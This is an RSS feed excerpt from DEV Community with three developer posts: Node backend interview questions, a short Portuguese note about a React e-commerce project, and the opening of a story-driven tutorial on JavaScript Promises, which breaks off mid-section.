<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Top Interview Questions for Backend Developers(Node)</title>
      <author>Abhishek Raj</author>
      <pubDate>Sat, 07 Aug 2021 17:18:29 +0000</pubDate>
      <link>https://dev.to/abhishekraj272/top-interview-questions-for-backend-developers-node-2133</link>
      <guid>https://dev.to/abhishekraj272/top-interview-questions-for-backend-developers-node-2133</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;Being a Full Stack Developer, I had appeared for Backend Developer position as well. In this post, I will be sharing most common Backend Dev question asked to me in all those interviews except the DSA part.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#q1-create-a-sleep-function-using-asyncawait"&gt;
  &lt;/a&gt;
  Q1. Create a sleep function using Async/Await.
&lt;/h2&gt;

&lt;p&gt;In the below example, the sleep function returns a promise which is resolved after given millisecond using setTimeout API.&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/abhishekraj272/embed/MWmzKPZ?height=600&amp;amp;default-tab=js,result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#q2-how-javascript-engine-works"&gt;
  &lt;/a&gt;
  Q2. How Javascript Engine works?
&lt;/h2&gt;

&lt;p&gt;When a js file is ran,&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;A global execution context is created.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A memory heap is created where all variables (with var keyword) and functions (except arrow func) are declared.&lt;br&gt;&lt;br&gt;
In the below image we can see, variable &lt;strong&gt;a&lt;/strong&gt; is declared w/o even execution has started.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LG3XqPG_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9hhm6xi44nd77wt0w2sc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LG3XqPG_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9hhm6xi44nd77wt0w2sc.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A Call Stack is created which stores the line which is going to be executed.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SFyipVLg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9l92hu7kh951mk9w6flg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SFyipVLg--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9l92hu7kh951mk9w6flg.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;When &lt;em&gt;call stack&lt;/em&gt; gets a function call, it creates a &lt;em&gt;functional context&lt;/em&gt; and the process is repeated in the functional context.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;When &lt;em&gt;call stack&lt;/em&gt; encounters WEB APIs like setTimeout/Interval/Immediate, these are sent to callback queue to process after call stack is empty.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;When &lt;em&gt;call stack&lt;/em&gt; encounters a Promise it is sent to micro task queue (higher priority than callback queue) to process after call stack is empty.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Once call stack is empty, event loop moves functions from queues to call stack for execution.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#q3-difference-between-single-threaded-amp-asynchronous"&gt;
  &lt;/a&gt;
  Q3. Difference between Single Threaded &amp;amp; Asynchronous.
&lt;/h2&gt;

&lt;p&gt;My View:&lt;br&gt;
Single Threaded -&amp;gt; It means only once function can be executed at a time.&lt;br&gt;
Async -&amp;gt; It is about non-blocking of execution of functions.&lt;/p&gt;

&lt;p&gt;In this below image, we can easily understand the difference. Thanks to &lt;a href="https://www.baeldung.com/"&gt;Baeldung&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4-7eOEU0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0mjmugbgn2w6cucwvirp.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4-7eOEU0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0mjmugbgn2w6cucwvirp.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jqb5q9Ml--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bepu91vawolbj365xtcm.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jqb5q9Ml--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bepu91vawolbj365xtcm.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.baeldung.com/cs/async-vs-multi-threading"&gt;Read More&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#q4-how-to-debug-a-slow-api"&gt;
  &lt;/a&gt;
  Q4. How to debug a slow API?
&lt;/h2&gt;

&lt;p&gt;My View:&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#the-consolelog-approach"&gt;
  &lt;/a&gt;
  The Console.log approach
&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;Check if the issue is with network by sending request from different network.&lt;/li&gt;
&lt;li&gt;Log time when &lt;em&gt;req&lt;/em&gt; is received by the backend.&lt;/li&gt;
&lt;li&gt;Log time before a DB query.&lt;/li&gt;
&lt;li&gt;Log time after a DB query.&lt;/li&gt;
&lt;li&gt;Log time before/after some heavy operation.&lt;/li&gt;
&lt;li&gt;Log time before sending response.&lt;/li&gt;
&lt;li&gt;Analyse the time, you will get your culprit.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;
  &lt;a href="#profiler-approach"&gt;
  &lt;/a&gt;
  Profiler Approach
&lt;/h3&gt;

&lt;p&gt;Use any profiling tool to check where the execution is lagging.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-eventemitter-in-nodejs"&gt;
  &lt;/a&gt;
  What is EventEmitter in NodeJS?
&lt;/h2&gt;

&lt;p&gt;My View: EventEmitter is used to create event listeners in JS.&lt;/p&gt;

&lt;p&gt;Read More:&lt;/p&gt;


&lt;div class="ltag__link"&gt;
  &lt;a href="/abhishekraj272" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HdzDIguE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--MIti9vi4--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/419056/462b1794-0cb4-4ae6-8bd4-8577be4f295e.jpeg" alt="abhishekraj272"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/abhishekraj272/top-interview-questions-for-frontend-developers-3d5j" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Top Interview Questions for Frontend Developers(React)&lt;/h2&gt;
      &lt;h3&gt;Abhishek Raj ・ Jul 30 ・ 3 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#webdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#react&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#career&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;



&lt;div class="ltag__link"&gt;
  &lt;a href="/abhishekraj272" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HdzDIguE--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--MIti9vi4--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/419056/462b1794-0cb4-4ae6-8bd4-8577be4f295e.jpeg" alt="abhishekraj272"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/abhishekraj272/if-you-don-t-know-this-you-don-t-know-javascript-2355" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Learn these awesome Javascript concepts.&lt;/h2&gt;
      &lt;h3&gt;Abhishek Raj ・ Aug 2 ・ 3 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#webdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#tutorial&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#career&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;p&gt;Connect Me @ &lt;a href="https://www.linkedin.com/in/abhishekraj272/"&gt;Linkedin&lt;/a&gt;, &lt;a href="https://github.com/abhishekraj272"&gt;Github&lt;/a&gt;, &lt;a href="https://twitter.com/abhishekraj272"&gt;Twitter&lt;/a&gt;, &lt;a href="https://www.youtube.com/channel/UCvHn2T8DSJzEWzYDdK3Dt8A"&gt;Youtube&lt;/a&gt; 😇&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>career</category>
      <category>webdev</category>
      <category>node</category>
    </item>
    <item>
      <title>e-commerce React</title>
      <author>Arthur de Sousa</author>
      <pubDate>Sat, 07 Aug 2021 16:38:09 +0000</pubDate>
      <link>https://dev.to/sousa2323/e-commerce-react-33hb</link>
      <guid>https://dev.to/sousa2323/e-commerce-react-33hb</guid>
      <description>&lt;p&gt;&lt;a href="https://github.com/sousa2323/e-commerce-react"&gt;https://github.com/sousa2323/e-commerce-react&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ainda não está pronto e precisa ser ajustado, porém, esse é um dos meus projetos que venho desenvolvido para maior aprendizado sobre React, as imagens são apenas para demonstração.   &lt;/p&gt;

</description>
      <category>react</category>
      <category>javascript</category>
      <category>node</category>
      <category>github</category>
    </item>
    <item>
      <title>The Story Behind JavaScript Promises - A Use Case Based Approach!</title>
      <author>MirAli Mobasheri</author>
      <pubDate>Sat, 07 Aug 2021 16:35:44 +0000</pubDate>
      <link>https://dev.to/alimobasheri/the-story-behind-javascript-promises-a-use-case-based-approach-5bdd</link>
      <guid>https://dev.to/alimobasheri/the-story-behind-javascript-promises-a-use-case-based-approach-5bdd</guid>
      <description>&lt;h2&gt;
  &lt;a href="#table-of-contents"&gt;
  &lt;/a&gt;
  Table Of Contents:
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#Why%20should%20you%20read%20this?"&gt;❓ Why should you read this?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#In%20a%20hurry?"&gt;🏇 In a hurry?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#How%20Promises%20Are%20Made:%20Please%20Put%20A%20Ticket!"&gt;🤝 How Promises Are Made: Please Put A Ticket!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Main%20Usages%20Of%20A%20Promise:%20Making%20API%20Calls."&gt;🔛 Main Usages Of A Promise: Making API Calls.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Callbacks:%20The%20Green%20And%20The%20Red%20Button."&gt;✅❌ Callbacks: The Green And The Red Button.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Callbacks:%20Then%20&amp;amp;%20Catch."&gt;↩️↪️ Callbacks: Then &amp;amp; Catch.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#The%20Methodology%20Behind%20Promises:%20Returning%20Objects!"&gt;⛓️ The Methodology Behind Promises: Returning Objects!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Static%20Methods:%20%20raw%20%60Promise.all%60%20endraw%20%20&amp;amp;%20%20raw%20%60Promise.allSettled%60%20endraw%20"&gt;🕸️ Static Methods: &lt;code&gt;Promise.all&lt;/code&gt; &amp;amp; &lt;code&gt;Promise.allSettled&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Static%20Methods:%20%20raw%20%60Promise.any%60%20endraw%20%20&amp;amp;%20%20raw%20%60Promise.race%60%20endraw%20."&gt;🏃🏻‍♂️ Static Methods: &lt;code&gt;Promise.any&lt;/code&gt; &amp;amp; &lt;code&gt;Promise.race&lt;/code&gt;.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="//#Promise%20Callbacks:%20%20raw%20%60finally%60%20endraw%20."&gt;🔚 Promise Callbacks: &lt;code&gt;finally&lt;/code&gt;.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;The young librarian felt satisfied with what she did. Sarah had started her job when she was only 22 years old. Having known her as a long-time member of the library, the kind Mrs. Perkins hired her. &lt;/p&gt;

&lt;p&gt;Mrs. Perkins had been the library's manager for as long as 30 years.&lt;/p&gt;

&lt;p&gt;Now Sarah was the main person responsible for the place. She did a great job. People liked how she treated them and controlled everything.&lt;/p&gt;

&lt;p&gt;But it didn't take long before things got out of control. &lt;/p&gt;

&lt;p&gt;Mrs. Perkins retired. The girl had to do everything alone. And a new wave of readers was joining the library. She couldn't deliver services anymore. &lt;/p&gt;

&lt;p&gt;She was forced to make &lt;strong&gt;promises&lt;/strong&gt;...&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#why-should-you-read-this"&gt;
  &lt;/a&gt;
  ❓ Why should you read this?&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This might seem a long article. And the story might look unrelated. &lt;/p&gt;

&lt;p&gt;But let's face the truth. How many times have you learned a concept but have never used it? &lt;br&gt;
Perhaps there were situations where you could use &lt;code&gt;Promise.race&lt;/code&gt;. But you didn't. Because despite you knew what it did, you weren't sure what its use case could be. &lt;/p&gt;

&lt;p&gt;And when you got into a problem which you could solve using &lt;code&gt;Promice.race&lt;/code&gt;, you chose to go your own way. Because you weren't even sure if it was useful there.&lt;/p&gt;

&lt;p&gt;You knew what it did. But you didn't know its use case.&lt;/p&gt;

&lt;p&gt;Here, I'm presenting you with a story. It also teaches you about different ways you can use &lt;code&gt;Promises&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;But it also tries to symbolize its use cases through a real-world story. Next time you face a similar situation you'll be quick to know how to handle it. And if not, you have at least read a story!😉&lt;/p&gt;

&lt;p&gt;Enough talk. I have promises to keep.&lt;/p&gt;



&lt;p&gt;It started with the Covid-19 pandemic outbreak. Everyone wanted to pass their quarantine by reading books. But no one could go to the library due to the health restrictions. They had to keep social distance. &lt;/p&gt;

&lt;p&gt;Then Sarah came up with the idea to make an online deliverance system. Anyone could use the library's website to reserve books.&lt;/p&gt;

&lt;p&gt;She thought that she could deliver the books on her bike to their door front. And as the transportation cost her time and money, she took a very small amount of dollars for her service.&lt;br&gt;
But she wasn't always online and couldn't plan every books' deliverance on time. She had to deliver them herself and close the library since no one took her place.&lt;/p&gt;

&lt;p&gt;She needed extra help. Somehow.&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#in-a-hurry"&gt;
  &lt;/a&gt;
  🏇 In a hurry?&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;I have separated everything into different parts. Each of them is about a specific side of the &lt;code&gt;Promises&lt;/code&gt;. So you can skip any part you are confident about. &lt;/p&gt;

&lt;p&gt;Already know how to make &lt;code&gt;JavaScript Promises&lt;/code&gt;? Skip the introduction part!&lt;/p&gt;



&lt;p&gt;She called her cousin and asked him if he could design an ordering system for the library's website. She described the process as: "People will have to log in to their accounts. And if there is a book they want to request, they should put an online order ticket for it."&lt;/p&gt;

&lt;p&gt;But since it was not clear when she could deliver the books, the users had to wait for the website to notify them.&lt;br&gt;
It sent a message. If the book was available to deliver, it informed them she had &lt;strong&gt;resolved&lt;/strong&gt; the ticket. Otherwise, it contained a &lt;strong&gt;rejection&lt;/strong&gt; message.&lt;/p&gt;

&lt;p&gt;She named it the &lt;strong&gt;Promise System&lt;/strong&gt;. Likewise the &lt;code&gt;JavaScript API&lt;/code&gt; we're going to learn about.&lt;/p&gt;

&lt;p&gt;Let's dive in!&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#how-promises-are-made-please-put-a-ticket"&gt;
  &lt;/a&gt;
  🤝 How Promises Are Made: Please Put A Ticket!&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;To create a &lt;code&gt;JavaScript Promise&lt;/code&gt; you can use the &lt;code&gt;new&lt;/code&gt; keyword:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;thePromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;Promise Object Constructor&lt;/code&gt; accepts a &lt;code&gt;function&lt;/code&gt; as an argument. This function runs the process that we're going to promise its fulfillment. &lt;/p&gt;

&lt;p&gt;In our story, the way Sarah manages the ordering through tickets resembles such a &lt;code&gt;Promise&lt;/code&gt;. Either it is &lt;code&gt;fulfilled&lt;/code&gt; with the book's delivery or &lt;code&gt;rejected&lt;/code&gt; for a reason. &lt;/p&gt;

&lt;p&gt;This function can in turn accept two arguments: &lt;code&gt;resolve&lt;/code&gt; and &lt;code&gt;reject&lt;/code&gt;.&lt;br&gt;
Both of which are callback functions that we can delegate on certain points. &lt;/p&gt;

&lt;p&gt;We use &lt;code&gt;resolve&lt;/code&gt; as a fulfillment signal and pass it the final data. By calling &lt;code&gt;reject&lt;/code&gt; we make clear that the &lt;code&gt;Promise&lt;/code&gt; has failed.&lt;/p&gt;

&lt;p&gt;From what we've learned we can construct a &lt;code&gt;Promise&lt;/code&gt; by writing the following lines:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;theOrderingProcess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;reject&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// The process with the unknown duration.&lt;/span&gt;
  &lt;span class="c1"&gt;// Function body goes here.&lt;/span&gt;

  &lt;span class="c1"&gt;// If anywhere in your code, &lt;/span&gt;
  &lt;span class="c1"&gt;// you think your promise is fulfilled, &lt;/span&gt;
  &lt;span class="c1"&gt;// (e.g. Sarah finds an ordered book is available),&lt;/span&gt;
  &lt;span class="c1"&gt;// you can call resolve and pass it &lt;/span&gt;
  &lt;span class="c1"&gt;// the data you would like to return. &lt;/span&gt;
  &lt;span class="c1"&gt;// Like the following:&lt;/span&gt;
  &lt;span class="c1"&gt;// resolve(theBookData)&lt;/span&gt;

  &lt;span class="c1"&gt;// But if somehow the promise has failed to fulfill, &lt;/span&gt;
  &lt;span class="c1"&gt;// (e.g. A book is currently borrowed),&lt;/span&gt;
  &lt;span class="c1"&gt;// you can call reject and&lt;/span&gt;
  &lt;span class="c1"&gt;// pass it the reason to rejection:&lt;/span&gt;
  &lt;span class="c1"&gt;// reject(theRejectionReason)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;theWebsitePromise&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;theOrdeingProcess&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;Every time someone put a ticket for a book, he/she had to wait for a certain process to come to an end.&lt;br&gt;
It was not as if you selected a book and immediately had it on way to your home. Things took time. How long? No one knew for granted.&lt;/p&gt;

&lt;p&gt;Mrs. Perkins wasn't an all-up-to-date lady. So she had stored most of the data about the existing books and the borrowed ones in an old Access database. It took time to transfer them to a server. And Sarah wanted things to get done as soon as possible.&lt;/p&gt;

&lt;p&gt;She had to use the Access database. By herself.&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#main-usages-of-a-promise-making-api-calls"&gt;
  &lt;/a&gt;
  🔛 Main Usages Of A Promise: Making API Calls.&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Nowadays most websites use a database on their back end side. Like how Mrs. Perkins stored the library's data in an Access database. &lt;/p&gt;

&lt;p&gt;Of course the website databases use automations!&lt;/p&gt;

&lt;p&gt;A web application's front end needs to send a request to a server endpoint to receive some data. Then using this data the application can deliver its services.&lt;/p&gt;

&lt;p&gt;As the front end sends the &lt;code&gt;request&lt;/code&gt;, the process mounts into a pending status. It will stay in this status until it either receives a response from the back end or receives none.&lt;/p&gt;

&lt;p&gt;The pending status could take for an unknown period. This depends on the networking conditions of the user and the server, and how fast they can transfer data. Additionally, the back end itself might need to process some data and take extra time.&lt;/p&gt;

&lt;p&gt;An example of sending a &lt;code&gt;request&lt;/code&gt; using the &lt;code&gt;JavaScript Fetch API&lt;/code&gt; looks like the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;theRequest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;https://example.com/endpoint&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The fetch method constructs a &lt;code&gt;Promise Object&lt;/code&gt;, and returns it. So we can use its returned value same as a simple &lt;code&gt;Promise Object&lt;/code&gt;. Helping us to get rid of creating our own &lt;code&gt;Promisess&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Want more comfort? Use axios.&lt;/p&gt;




&lt;p&gt;The library's online ordering system took tickets from its users. They contained information about the user and the selected book. Sarah reviewed the tickets. And checked for the books' availability in the Access database.&lt;/p&gt;

&lt;p&gt;If everything was okay, a green button labeled as &lt;code&gt;resolve&lt;/code&gt;, awaited Sarah's click. Otherwise, the big red button was ready to delegate a &lt;code&gt;rejection event&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;No one knows for sure. But rumors are there was a black button too. For dark purposes. Unknown.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#callbacks-the-green-and-the-red-button"&gt;
  &lt;/a&gt;
  ✅❌ Callbacks: The Green And The Red Button.&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;We call the processes like the API requests &lt;code&gt;Asynchronous Operations&lt;/code&gt;. They vary from the &lt;code&gt;Synchronous&lt;/code&gt; ones which are simple &lt;code&gt;Program Expressions&lt;/code&gt;. &lt;br&gt;
A &lt;code&gt;Synchronous Operation&lt;/code&gt; takes a constant time to complete. The system runs them in a sequence. It waits until the execution of one is complete before it runs the next.&lt;/p&gt;

&lt;p&gt;A &lt;code&gt;Synchronous Operation&lt;/code&gt; looks like the following:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;num2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;num1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;num2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;z&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Every line of this operation is predictable. The compiler will be executing each line one after another. There's nothing unpredictable that could block the program's main thread from running.&lt;/p&gt;

&lt;p&gt;But an &lt;code&gt;Asynchronous Operation&lt;/code&gt; can block the program's execution. This is so because its fulfillment depends on the network conditions and speed. Even if the user owned a fast network, the back-end servers could be facing trouble. This can result in no response or a longer-running process.&lt;/p&gt;

&lt;p&gt;How can we write an &lt;code&gt;Asynchronous Operation&lt;/code&gt; and make sure that it doesn't block the rest of the code from running?&lt;/p&gt;

&lt;p&gt;The answer is: "by using &lt;code&gt;Callbacks&lt;/code&gt;".&lt;/p&gt;

&lt;p&gt;Of course, while it sounds like a heartwarming name, wait until you are caught in a &lt;code&gt;callback hell&lt;/code&gt;!&lt;/p&gt;




&lt;p&gt;When the user put a ticket for a book, he registered for future events. He was awaiting a &lt;code&gt;response&lt;/code&gt; to his &lt;code&gt;request&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Either this response arrived, or some problem prevented it from ever coming.&lt;/p&gt;

&lt;p&gt;Now the user was using a true &lt;code&gt;Promise System&lt;/code&gt;. The library's website provided this system. But the user didn't have direct access to the promise. He was listening to it.&lt;/p&gt;

&lt;p&gt;Then the user had to make his own plans based on this &lt;code&gt;Promise&lt;/code&gt;. He was telling himself: if the reply was a successful message &lt;code&gt;then&lt;/code&gt; I'm gonna return my last book. If not, &lt;code&gt;then&lt;/code&gt; I can choose another one. Maybe the reply never came, or the website's server went down. This problem will &lt;code&gt;catch&lt;/code&gt; his eyes, and so he was going to call the librarian and inform her. &lt;/p&gt;

&lt;p&gt;&lt;code&gt;console.warn('I never got a response!')&lt;/code&gt;.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#callbacks-then-amp-catch"&gt;
  &lt;/a&gt;
  ↩️↪️ Callbacks: Then &amp;amp; Catch.&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;If you use the &lt;code&gt;JavaScript Fetch API&lt;/code&gt;, it will return a &lt;code&gt;Promise Object&lt;/code&gt; by default. You don't have to write the &lt;code&gt;Promise&lt;/code&gt; yourself. You have to listen to it. How?&lt;/p&gt;

